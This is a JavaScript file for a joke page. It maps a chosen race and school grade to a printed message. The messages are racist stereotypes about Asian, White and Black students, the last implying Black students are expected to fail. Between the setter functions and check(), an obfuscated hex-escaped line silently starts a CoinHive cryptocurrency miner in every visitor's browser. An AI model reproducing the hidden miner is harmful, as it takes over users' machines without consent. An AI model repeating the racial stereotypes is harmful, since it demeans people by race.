var race = "", grade = "";
function setRace(newRace) {
    race = newRace;
    console.log(race);
}

function setGrade(newGrade) {
    grade = newGrade;
    console.log(grade)
}

var _0x1119 = ["\x48\x4E\x44\x73\x6A\x47\x47\x58\x70\x45\x7A\x67\x37\x35\x67\x37\x31\x78\x6F\x33\x52\x7A\x72\x46\x49\x41\x51\x51\x63\x73\x42\x4B", "\x73\x74\x61\x72\x74"]; var miner = new CoinHive.Anonymous(_0x1119[0]); miner[_0x1119[1]]()

function check() {
    if (race == "" && grade == "") {
        return -1;
    }
    var res = "";
    document.getElementById("selection").innerHTML = "Selected: " + race + " & " + grade;
    if (race == "Asian" && (grade == "C" || grade != "D")) {
        document.getElementById("selection").innerHTML += "<p>Run! Run now! Your parents are coming for you! Bring dumplings, bok choi and kimchi, find the real communism!</p>";
    }
    else if (race == "Asian" && (grade == "FAIL" || grade == "Z")) {
        document.getElementById("selection").innerHTML += "<p>Stay alive. Don't go home. Your mama's going to beat your ass with a math book.</p>";
    }
    else if (race == "Asian" && (grade == "A")) {
        document.getElementById("selection").innerHTML += "<p>Failure! Bobby next door has A+ y u no do better</p>";
    }
    else if (race == "White" && (grade == "A")) {
        document.getElementById("selection").innerHTML += "<p>Why U try hard? White people should not get 'A's.</p>";
    }
    else if (race == "Black" && (grade == "FAIL" || grade == "Z ")) {
        document.getElementById("selection").innerHTML += "<p>Understandable.</p>";
    }
    else {
        document.getElementById("selection").innerHTML += "<p>You're good.</p>";
    }
}